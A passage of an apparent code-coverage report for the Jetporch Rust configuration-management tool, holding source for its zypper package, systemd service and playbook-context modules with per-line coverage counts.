\u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = match \u0026self.version {\n            Some(version) =\u003e format!(\"zypper --non-interactive --quiet update '{}={}'\", self.package, version),\n            None =\u003e format!(\"zypper --non-interactive --quiet update '{}'\", self.package),\n        };\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n    fn remove_package(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"zypper --non-interactive --quiet remove '{}'\", self.package);\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n}\n\nimpl ZypperAction {\n\n    // Takes the zypper output table and extract the version out of the table body\n    // The tables often looks like this, including the additional empty line.\n    //\n    // ```text\n    //\n    // S  | Name | Type    | Version   | Arch   | Repository\n    // ---+------+---------+-----------+--------+------------------------\n    // i+ | curl | package | 8.3.0-1.1 | x86_64 | openSUSE-Tumbleweed-Oss\n    // ```\n\n    pub fn parse_zypper_search_table(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, out: \u0026str) \n    -\u003e Result\u003cOption\u003cPackageDetails\u003e,Arc\u003cTaskResponse\u003e\u003e {\n\n        let skip_header = out.trim().lines().nth(2);\n        let row = match skip_header {\n            Some(r) =\u003e r,\n            None =\u003e return Err(handle.response.is_failed(request, \u0026format!(\"unable to parse unexpected output from zypper (1): {}\", out)))\n        };\n        return match row.split(\"|\").nth(3) {\n            Some(version) =\u003e Ok(Some(PackageDetails { name: self.package.clone(), version: version.trim().to_string() })),\n            None =\u003e Err(handle.response.is_failed(request, \u0026format!(\"unable to parse unexpected output from zypper (2): {}\", out)))\n        };\n    }\n\n}\n","traces":[{"line":46,"address":[],"length":0,"stats":{"Line":0}},{"line":47,"address":[],"length":0,"stats":{"Line":0}},{"line":48,"address":[],"length":0,"stats":{"Line":0}},{"line":50,"address":[],"length":0,"stats":{"Line":0}},{"line":51,"address":[],"length":0,"stats":{"Line":0}},{"line":52,"address":[],"length":0,"stats":{"Line":0}},{"line":53,"address":[],"length":0,"stats":{"Line":0}},{"line":54,"address":[],"length":0,"stats":{"Line":0}},{"line":55,"address":[],"length":0,"stats":{"Line":0}},{"line":56,"address":[],"length":0,"stats":{"Line":0}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":68,"address":[],"length":0,"stats":{"Line":0}},{"line":69,"address":[],"length":0,"stats":{"Line":0}},{"line":75,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":80,"address":[],"length":0,"stats":{"Line":0}},{"line":81,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":85,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":100,"address":[],"length":0,"stats":{"Line":0}},{"line":101,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":110,"address":[],"length":0,"stats":{"Line":0}},{"line":111,"address":[],"length":0,"stats":{"Line":0}},{"line":112,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":116,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":119,"address":[],"length":0,"stats":{"Line":0}},{"line":121,"address":[],"length":0,"stats":{"Line":0}},{"line":124,"address":[],"length":0,"stats":{"Line":0}},{"line":128,"address":[],"length":0,"stats":{"Line":0}},{"line":129,"address":[],"length":0,"stats":{"Line":0}},{"line":130,"address":[],"length":0,"stats":{"Line":0}},{"line":131,"address":[],"length":0,"stats":{"Line":0}},{"line":133,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":138,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":145,"address":[],"length":0,"stats":{"Line":0}},{"line":146,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":168,"address":[],"length":0,"stats":{"Line":0}},{"line":169,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}}],"covered":0,"coverable":68},{"path":["/","Users","wings","projects","jetpack","src","modules","services","mod.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\n/** ADD MODULES HERE, KEEP ALPHABETIZED **/\n\npub mod sd_service;","traces":[],"covered":0,"coverable":0},{"path":["/","Users","wings","projects","jetpack","src","modules","services","sd_service.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::tasks::*;\nuse crate::handle::handle::{TaskHandle,CheckRc};\nuse crate::tasks::fields::Field;\nuse serde::{Deserialize};\nuse std::sync::Arc;\nuse std::vec::Vec;\n\nconst MODULE: \u0026str = \"sd_service\";\n\n#[derive(Deserialize,Debug)]\n#[serde(deny_unknown_fields)]\npub struct SystemdServiceTask {\n    pub name: Option\u003cString\u003e,\n    pub service: String,\n    pub enabled: Option\u003cString\u003e,\n    pub started: Option\u003cString\u003e,\n    pub restart: Option\u003cString\u003e,\n    pub with: Option\u003cPreLogicInput\u003e,\n    pub and: Option\u003cPostLogicInput\u003e\n}\n\nstruct SystemdServiceAction {\n    pub service: String,\n    pub enabled: Option\u003cbool\u003e,\n    pub started: Option\u003cbool\u003e,\n    pub restart: bool,\n}\n\n#[derive(Clone,PartialEq,Debug)]\nstruct ServiceDetails {\n    enabled: bool,\n    started: bool,\n}\n\nimpl IsTask for SystemdServiceTask {\n\n    fn get_module(\u0026self) -\u003e String { String::from(MODULE) }\n    fn get_name(\u0026self) -\u003e Option\u003cString\u003e { self.name.clone() }\n    fn get_with(\u0026self) -\u003e Option\u003cPreLogicInput\u003e { self.with.clone() }\n\n    fn evaluate(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e, tm: TemplateMode) -\u003e Result\u003cEvaluatedTask, Arc\u003cTaskResponse\u003e\u003e {\n        return Ok(\n            EvaluatedTask {\n                action: Arc::new(SystemdServiceAction {\n                    service:    handle.template.string_no_spaces(request, tm, \u0026String::from(\"service\"), \u0026self.service)?,\n                    enabled:    handle.template.boolean_option_default_none(\u0026request, tm, \u0026String::from(\"enabled\"), \u0026self.enabled)?,\n                    started:    handle.template.boolean_option_default_none(\u0026request, tm, \u0026String::from(\"started\"), \u0026self.started)?,\n                    restart:    handle.template.boolean_option_default_false(\u0026request, tm, \u0026String::from(\"restart\"), \u0026self.restart)?\n                }),\n                with: Arc::new(PreLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.with)?),\n                and: Arc::new(PostLogicInput::template(\u0026handle, \u0026request, tm, \u0026self.and)?)\n            }\n        );\n    }\n\n}\n\n\nimpl IsAction for SystemdServiceAction {\n\n    fn dispatch(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e, Arc\u003cTaskResponse\u003e\u003e {\n    \n        match request.request_type {\n\n            TaskRequestType::Query =\u003e {\n\n                let mut changes : Vec\u003cField\u003e = Vec::new();\n                let actual = self.get_service_details(handle, request)?; \n\n                match (actual.enabled, self.enabled) {\n                    (true, Some(false)) =\u003e { changes.push(Field::Disable); },\n                    (false, Some(true)) =\u003e { changes.push(Field::Enable);  },\n                    _  =\u003e {}\n                };\n\n                match (actual.started, self.started, self.restart) {\n                    (_,     Some(false), true)   =\u003e { return Err(handle.response.is_failed(request, \u0026String::from(\"started:false and restart:true conflict\"))); },\n                    (true,  Some(true),  true)   =\u003e { changes.push(Field::Restart); },\n                    (true,  None,        true)   =\u003e { changes.push(Field::Restart); /* a little weird, but we know what you mean */ },\n                    (false, None,        true)   =\u003e { changes.push(Field::Start);   /* a little weird, but we know what you mean */ },\n                    (false, Some(true),  _)      =\u003e { changes.push(Field::Start); },\n                    (true,  Some(false), false)  =\u003e { changes.push(Field::Stop); },      \n                    _                            =\u003e { },\n                };\n\n\n                if changes.len() \u003e 0 {\n                    return Ok(handle.response.needs_modification(request, \u0026changes));\n                } else {\n                    return Ok(handle.response.is_matched(request));\n                }\n\n            },\n\n            TaskRequestType::Modify =\u003e {\n\n                if request.changes.contains(\u0026Field::Start)        { self.do_start(handle, request)?;   }\n                else if request.changes.contains(\u0026Field::Stop)    { self.do_stop(handle, request)?;    }\n                else if request.changes.contains(\u0026Field::Restart) { self.do_restart(handle, request)?; }\n\n                if request.changes.contains(\u0026Field::Enable)       { self.do_enable(handle, request)?;  }\n                else if request.changes.contains(\u0026Field::Disable) { self.do_disable(handle, request)?; }\n\n                return Ok(handle.response.is_modified(request, request.changes.clone()));\n            }\n    \n            _ =\u003e { return Err(handle.response.not_supported(request)); }\n    \n        }\n    }\n\n}\n\nimpl SystemdServiceAction {\n\n    pub fn get_service_details(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cServiceDetails,Arc\u003cTaskResponse\u003e\u003e {\n        \n        let is_enabled : bool;\n        let is_active  : bool;\n        let is_enabled_cmd = format!(\"systemctl is-enabled '{}'\", self.service);\n        let is_active_cmd = format!(\"systemctl is-active '{}'\", self.service);\n        \n        let result = handle.remote.run(request, \u0026is_enabled_cmd, CheckRc::Unchecked)?;\n        let (_rc,out) = cmd_info(\u0026result);\n        if out.find(\"disabled\").is_some() || out.find(\"deactivating\").is_some() { is_enabled = false; }\n        else if out.find(\"enabled\").is_some() || out.find(\"alias\").is_some() { is_enabled = true; } \n        else {\n            return Err(handle.response.is_failed(request, \u0026format!(\"systemctl enablement status unexpected for service({}): ({})\", self.service, out))); \n        }\n\n        let result2 = handle.remote.run(request, \u0026is_active_cmd, CheckRc::Unchecked)?;\n        let (_rc2,out2) = cmd_info(\u0026result2);\n        if out2.find(\"inactive\").is_some() || out2.find(\"failed\").is_some() { is_active = false; }\n        else if out2.find(\"active\").is_some() { is_active = true; }\n        else { \n            return Err(handle.response.is_failed(request, \u0026format!(\"systemctl activity status unexpected for service({}): {}\", self.service, out2))); \n        }\n\n        return Ok(ServiceDetails {\n            enabled: is_enabled,\n            started: is_active,\n        });\n    }\n\n    pub fn do_start(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"systemctl start '{}'\", self.service);\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n    \n    pub fn do_stop(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"systemctl stop '{}'\", self.service);\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n    \n    pub fn do_enable(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"systemctl enable '{}'\", self.service);\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n    \n    pub fn do_disable(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"systemctl disable '{}'\", self.service);\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n    pub fn do_restart(\u0026self, handle: \u0026Arc\u003cTaskHandle\u003e, request: \u0026Arc\u003cTaskRequest\u003e) -\u003e Result\u003cArc\u003cTaskResponse\u003e,Arc\u003cTaskResponse\u003e\u003e {\n        let cmd = format!(\"systemctl restart '{}'\", self.service);\n        return handle.remote.run(request, \u0026cmd, CheckRc::Checked);\n    }\n\n}\n","traces":[{"line":53,"address":[],"length":0,"stats":{"Line":2}},{"line":54,"address":[],"length":0,"stats":{"Line":1}},{"line":55,"address":[],"length":0,"stats":{"Line":1}},{"line":57,"address":[],"length":0,"stats":{"Line":0}},{"line":58,"address":[],"length":0,"stats":{"Line":0}},{"line":59,"address":[],"length":0,"stats":{"Line":0}},{"line":60,"address":[],"length":0,"stats":{"Line":0}},{"line":61,"address":[],"length":0,"stats":{"Line":0}},{"line":62,"address":[],"length":0,"stats":{"Line":0}},{"line":63,"address":[],"length":0,"stats":{"Line":0}},{"line":64,"address":[],"length":0,"stats":{"Line":0}},{"line":66,"address":[],"length":0,"stats":{"Line":0}},{"line":67,"address":[],"length":0,"stats":{"Line":0}},{"line":77,"address":[],"length":0,"stats":{"Line":0}},{"line":79,"address":[],"length":0,"stats":{"Line":0}},{"line":83,"address":[],"length":0,"stats":{"Line":0}},{"line":84,"address":[],"length":0,"stats":{"Line":0}},{"line":86,"address":[],"length":0,"stats":{"Line":0}},{"line":87,"address":[],"length":0,"stats":{"Line":0}},{"line":88,"address":[],"length":0,"stats":{"Line":0}},{"line":89,"address":[],"length":0,"stats":{"Line":0}},{"line":92,"address":[],"length":0,"stats":{"Line":0}},{"line":93,"address":[],"length":0,"stats":{"Line":0}},{"line":94,"address":[],"length":0,"stats":{"Line":0}},{"line":95,"address":[],"length":0,"stats":{"Line":0}},{"line":96,"address":[],"length":0,"stats":{"Line":0}},{"line":97,"address":[],"length":0,"stats":{"Line":0}},{"line":98,"address":[],"length":0,"stats":{"Line":0}},{"line":99,"address":[],"length":0,"stats":{"Line":0}},{"line":103,"address":[],"length":0,"stats":{"Line":0}},{"line":104,"address":[],"length":0,"stats":{"Line":0}},{"line":106,"address":[],"length":0,"stats":{"Line":0}},{"line":113,"address":[],"length":0,"stats":{"Line":0}},{"line":114,"address":[],"length":0,"stats":{"Line":0}},{"line":115,"address":[],"length":0,"stats":{"Line":0}},{"line":117,"address":[],"length":0,"stats":{"Line":0}},{"line":118,"address":[],"length":0,"stats":{"Line":0}},{"line":120,"address":[],"length":0,"stats":{"Line":0}},{"line":123,"address":[],"length":0,"stats":{"Line":0}},{"line":132,"address":[],"length":0,"stats":{"Line":0}},{"line":134,"address":[],"length":0,"stats":{"Line":0}},{"line":135,"address":[],"length":0,"stats":{"Line":0}},{"line":136,"address":[],"length":0,"stats":{"Line":0}},{"line":137,"address":[],"length":0,"stats":{"Line":0}},{"line":139,"address":[],"length":0,"stats":{"Line":0}},{"line":140,"address":[],"length":0,"stats":{"Line":0}},{"line":141,"address":[],"length":0,"stats":{"Line":0}},{"line":142,"address":[],"length":0,"stats":{"Line":0}},{"line":144,"address":[],"length":0,"stats":{"Line":0}},{"line":147,"address":[],"length":0,"stats":{"Line":0}},{"line":148,"address":[],"length":0,"stats":{"Line":0}},{"line":149,"address":[],"length":0,"stats":{"Line":0}},{"line":150,"address":[],"length":0,"stats":{"Line":0}},{"line":152,"address":[],"length":0,"stats":{"Line":0}},{"line":155,"address":[],"length":0,"stats":{"Line":0}},{"line":156,"address":[],"length":0,"stats":{"Line":0}},{"line":157,"address":[],"length":0,"stats":{"Line":0}},{"line":161,"address":[],"length":0,"stats":{"Line":0}},{"line":162,"address":[],"length":0,"stats":{"Line":0}},{"line":163,"address":[],"length":0,"stats":{"Line":0}},{"line":166,"address":[],"length":0,"stats":{"Line":0}},{"line":167,"address":[],"length":0,"stats":{"Line":0}},{"line":168,"address":[],"length":0,"stats":{"Line":0}},{"line":171,"address":[],"length":0,"stats":{"Line":0}},{"line":172,"address":[],"length":0,"stats":{"Line":0}},{"line":173,"address":[],"length":0,"stats":{"Line":0}},{"line":176,"address":[],"length":0,"stats":{"Line":0}},{"line":177,"address":[],"length":0,"stats":{"Line":0}},{"line":178,"address":[],"length":0,"stats":{"Line":0}},{"line":181,"address":[],"length":0,"stats":{"Line":0}},{"line":182,"address":[],"length":0,"stats":{"Line":0}},{"line":183,"address":[],"length":0,"stats":{"Line":0}}],"covered":3,"coverable":72},{"path":["/","Users","wings","projects","jetpack","src","playbooks","context.rs"],"content":"// Jetporch\n// Copyright (C) 2023 - Michael DeHaan \u003cmichael@michaeldehaan.net\u003e + contributors\n//\n// This program is free software: you can redistribute it and/or modify\n// it under the terms of the GNU General Public License as published by\n// the Free Software Foundation, either version 3 of the License, or\n// at your option) any later version.\n// \n// This program is distributed in the hope that it will be useful,\n// but WITHOUT ANY WARRANTY; without even the implied warranty of\n// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n// GNU General Public License for more details.\n// \n// You should have received a copy of the GNU General Public License\n// long with this program.  If not, see \u003chttp://www.gnu.org/licenses/\u003e.\n\nuse crate::util::io::{path_as_string,directory_as_string};\nuse crate::playbooks::language::{Play,Role,RoleInvocation};\nuse std::path::PathBuf;\nuse std::collections::HashMap;\nuse crate::inventory::hosts::Host;\nuse std::sync::{Arc,RwLock};\nuse crate::connection::cache::ConnectionCache;\nuse crate::registry::list::Task;\nuse crate::util::yaml::blend_variables;\nuse crate::playbooks::templar::{Templar,TemplateMode};\nuse crate::cli::parser::CliParser;\nuse crate::handle::template::BlendTarget;\nuse std::ops::Deref;\nuse std::env;\nuse guid_create::GUID;\nuse expanduser::expanduser;\n\n// the playbook traversal state, and a little bit more than that.\n// the playbook context keeps track of where we are in a playbook\n// execution and various results/stats along the way.\n\npub struct PlaybookContext {\n\n    pub verbosity: u32,\n\n    pub playbook_path: Option\u003cString\u003e,\n    pub playbook_directory: Option\u003cString\u003e,\n    pub play: Option\u003cString\u003e,\n    \n    pub role: Option\u003cRole\u003e,\n    pub role_path: Option\u003cString\u003e,\n    pub play_count: usize,\n    pub role_count: usize,\n\n    pub task_count: usize,\n    pub task: Option\u003cString\u003e,\n    \n    seen_hosts:               HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e,\n    targetted_hosts:          HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e,\n    failed_hosts:             HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e,\n\n    attempted_count_for_host: HashMap\u003cString, usize\u003e,\n    adjusted_count_for_host:  HashMap\u003cString, usize\u003e,\n    created_count_for_host:   HashMap\u003cString, usize\u003e,\n    removed_count_for_host:   HashMap\u003cString, usize\u003e,\n    modified_count_for_host:  HashMap\u003cString, usize\u003e,\n    executed_count_for_host:  HashMap\u003cString, usize\u003e,\n    passive_count_for_host:   HashMap\u003cString, usize\u003e,\n    matched_count_for_host:   HashMap\u003cString, usize\u003e,\n    skipped_count_for_host:   HashMap\u003cString, usize\u003e,\n    failed_count_for_host:    HashMap\u003cString, usize\u003e,\n    \n    // TODO: some of these don't need to be pub.\n    pub failed_tasks:           usize,\n    pub defaults_storage:       RwLock\u003cserde_yaml::Mapping\u003e,\n    pub vars_storage:           RwLock\u003cserde_yaml::Mapping\u003e,\n    pub role_defaults_storage:  RwLock\u003cserde_yaml::Mapping\u003e,\n    pub role_vars_storage:      RwLock\u003cserde_yaml::Mapping\u003e,\n    pub env_storage:            RwLock\u003cserde_yaml::Mapping\u003e,\n    \n    pub connection_cache:     RwLock\u003cConnectionCache\u003e,\n    pub templar:              RwLock\u003cTemplar\u003e,\n\n    pub ssh_user:             String,\n    pub ssh_port:             i64,\n    pub sudo:                 Option\u003cString\u003e,\n    extra_vars:               serde_yaml::Value,\n\n}\n\nimpl PlaybookContext {\n\n    pub fn new(parser: \u0026CliParser) -\u003e Self {\n        let mut s = Self {\n            verbosity: parser.verbosity,\n            playbook_path: None,\n            playbook_directory: None,\n            failed_tasks: 0,\n            play: None,\n            role: None,\n            task: None,\n            play_count : 0,\n            role_count : 0,\n            task_count : 0,\n            seen_hosts: HashMap::new(),\n            targetted_hosts: HashMap::new(),\n            failed_hosts: HashMap::new(),\n            role_path: None,\n            adjusted_count_for_host:  HashMap::new(),\n            attempted_count_for_host: HashMap::new(),\n            created_count_for_host:   HashMap::new(),\n            removed_count_for_host:   HashMap::new(),\n            modified_count_for_host:  HashMap::new(),\n            executed_count_for_host:  HashMap::new(),\n            passive_count_for_host:   HashMap::new(),\n            matched_count_for_host:   HashMap::new(),\n            failed_count_for_host:    HashMap::new(),\n            skipped_count_for_host:   HashMap::new(),\n            connection_cache:         RwLock::new(ConnectionCache::new()),\n            templar:                  RwLock::new(Templar::new()),\n            defaults_storage:         RwLock::new(serde_yaml::Mapping::new()),\n            vars_storage:             RwLock::new(serde_yaml::Mapping::new()),\n            role_vars_storage:        RwLock::new(serde_yaml::Mapping::new()),\n            role_defaults_storage:    RwLock::new(serde_yaml::Mapping::new()),\n            env_storage:              RwLock::new(serde_yaml::Mapping::new()),\n            ssh_user:                 parser.default_user.clone(),\n            ssh_port:                 parser.default_port,\n            sudo:                     parser.sudo.clone(),\n            extra_vars:               parser.extra_vars.clone(),\n        };\n        s.load_environment();\n        return s;\n    }\n\n    // the remaining hosts in a play are those that have not failed yet\n    // other functions remove these hosts from the list.\n\n    pub fn get_remaining_hosts(\u0026self) -\u003e HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e {\n        let mut results : HashMap\u003cString, Arc\u003cRwLock\u003cHost\u003e\u003e\u003e = HashMap::new();\n        for (k,v) in self.targetted_hosts.iter() {\n            results.insert(k.clone(), Arc::clone(\u0026v));\n        }\n        return results;\n    }\n\n    // SSH details are set in traversal and may come from the playbook or\n    // or CLI options. These values are not guaranteed to be used as magic\n    // variables could still exist in inventory for particular hosts\n\n    pub fn set_ssh_user(\u0026mut self, ssh_user: \u0026String) {\n        self.ssh_user = ssh_user.clone();\n    }\n\n    pub fn set_ssh_port(\u0026mut self, ssh_port: i64) {\n        self.ssh_port = ssh_port;\n    }\n\n    // used in traversal to tell the context what the current set of possible\n    // hosts is.\n\n    pub fn set_targetted_hosts(\u0026mut self, hosts: \u0026Vec\u003cArc\u003cRwLock\u003cHost\u003e\u003e\u003e) {\n        self.targetted_hosts.clear();\n        for host in hosts.iter() {\n            let hostname = host.read().unwrap().name.clone();\n            match self.failed_hosts.contains_key(\u0026hostname) {\n                true =\u003e {},\n                false =\u003e { \n                    self.seen_hosts.insert(hostname.clone(), Arc::clone(\u0026host));\n                    self.targetted_hosts.insert(hostname.clone(), Arc::clone(\u0026host)); \n                }\n            }\n        }\n    }\n\n    // called when a host returns an unacceptable final response.  removes\n    // the host from the targetted pool for the play.  when no hosts\n    // remain the entire play will fail.\n\n    pub fn fail_host(\u0026mut self, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e) {\n        let host2 = host.read().unwrap();\n        let hostname = host2.name.clone();\n        self.failed_tasks = self.failed_tasks + 1;\n\n        \n        self.targetted_hosts.remove(\u0026hostname);\n        self.failed_hosts.insert(hostname.clone(), Arc::clone(\u0026host));\n    }\n\n    pub fn set_playbook_path(\u0026mut self, path: \u0026PathBuf) {\n        self.playbook_path = Some(path_as_string(\u0026path));\n        self.playbook_directory = Some(directory_as_string(\u0026path));\n    }\n\n    pub fn set_task(\u0026mut self, task: \u0026Task) {\n        self.task = Some(task.get_display_name());\n    }\n\n    pub fn set_play(\u0026mut self, play: \u0026Play) {\n        self.play = Some(play.name.clone());\n        self.play_count = self.play_count + 1;\n    }\n\n    pub fn get_play_name(\u0026self) -\u003e String {\n        return match \u0026self.play {\n            Some(x) =\u003e x.clone(),\n            None =\u003e panic!(\"attempting to read a play name before plays have been evaluated\")\n        }\n    }\n\n    pub fn set_role(\u0026mut self, role: \u0026Role, invocation: \u0026RoleInvocation, role_path: \u0026String) {\n        self.role = Some(role.clone());\n        self.role_path = Some(role_path.clone());\n        if role.defaults.is_some() { \n             *self.role_defaults_storage.write().unwrap() = role.defaults.as_ref().unwrap().clone();\n        }\n        if invocation.vars.is_some() { \n            *self.role_vars_storage.write().unwrap() = invocation.vars.as_ref().unwrap().clone();\n        }\n    }\n\n    pub fn unset_role(\u0026mut self) {\n        self.role = None;\n        self.role_path = None;\n        self.role_defaults_storage.write().unwrap().clear();\n        self.role_vars_storage.write().unwrap().clear();\n    }\n\n    // template functions need to access all the variables about a host taking variable precendence rules into effect\n    // to get a dictionary of variables to use in template expressions\n\n    pub fn get_complete_blended_variables(\u0026self, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, blend_target: BlendTarget) -\u003e serde_yaml::Mapping  {\n        let blended = self.get_complete_blended_variables_as_value(host, blend_target);\n        return match blended {\n            serde_yaml::Value::Mapping(x) =\u003e x,\n            _ =\u003e panic!(\"unexpected, get_blended_variables produced a non-mapping (3)\")\n        };\n    }\n\n    pub fn get_complete_blended_variables_as_value(\u0026self, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, blend_target: BlendTarget) -\u003e serde_yaml::Value  {\n        \n        let mut blended = serde_yaml::Value::from(serde_yaml::Mapping::new());\n        let src1 = self.defaults_storage.read().unwrap();\n        let src1a = src1.deref();\n        blend_variables(\u0026mut blended, serde_yaml::Value::Mapping(src1a.clone()));\n        \n        let src1r = self.role_defaults_storage.read().unwrap();\n        let src1ar = src1r.deref();\n        blend_variables(\u0026mut blended, serde_yaml::Value::Mapping(src1ar.clone()));\n\n        let src2 = host.read().unwrap().get_blended_variables();\n        blend_variables(\u0026mut blended, serde_yaml::Value::Mapping(src2));\n\n        let src3 = self.vars_storage.read().unwrap();\n        let src3a = src3.deref();\n        blend_variables(\u0026mut blended, serde_yaml::Value::Mapping(src3a.clone()));\n\n        let src3r = self.role_vars_storage.read().unwrap();\n        let src3ar = src3r.deref();\n        blend_variables(\u0026mut blended, serde_yaml::Value::Mapping(src3ar.clone()));\n\n        blend_variables(\u0026mut blended, self.extra_vars.clone());\n\n        match blend_target {\n            BlendTarget::NotTemplateModule =\u003e { },\n            BlendTarget::TemplateModule =\u003e {\n                // for security reasons env vars from security tools like 'op run' are only exposed to the template module\n                // to prevent accidental leakage into logs and history\n                let src4 = self.env_storage.read().unwrap();\n                let src4a = src4.deref();\n                blend_variables(\u0026mut blended, serde_yaml::Value::Mapping(src4a.clone()));\n            }\n        };\n        return blended;\n    }\n\n    // template code is not used here directly, but in handle/template.rs, which passes back through here, since\n    // only the context knows all the variables from the playbook traversal to fill in and how to blend\n    // variables in the correct order.\n\n    pub fn render_template(\u0026self, template: \u0026String, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, blend_target: BlendTarget, template_mode: TemplateMode) -\u003e Result\u003cString,String\u003e {\n        let vars = self.get_complete_blended_variables(host, blend_target);\n        return self.templar.read().unwrap().render(template, vars, template_mode);\n    }\n\n    // testing conditions for truthiness works much like templating strings\n\n    pub fn test_condition(\u0026self, expr: \u0026String, host: \u0026Arc\u003cRwLock\u003cHost\u003e\u003e, tm: TemplateMode) -\u003e Result\u003cbool,String\u003e {\n        let vars = self.get_complete_blended_variables(host, BlendTarget::NotTemplateModule);\n        return self.templar.read().unwrap().test_condition(expr, vars, tm);\n    }\n\n    // a version of template evaluation that allows some additional variables, for example from a module\n\n    pub fn test_condition_with_extra_data(\u0026self, expr: \u0026String, host: 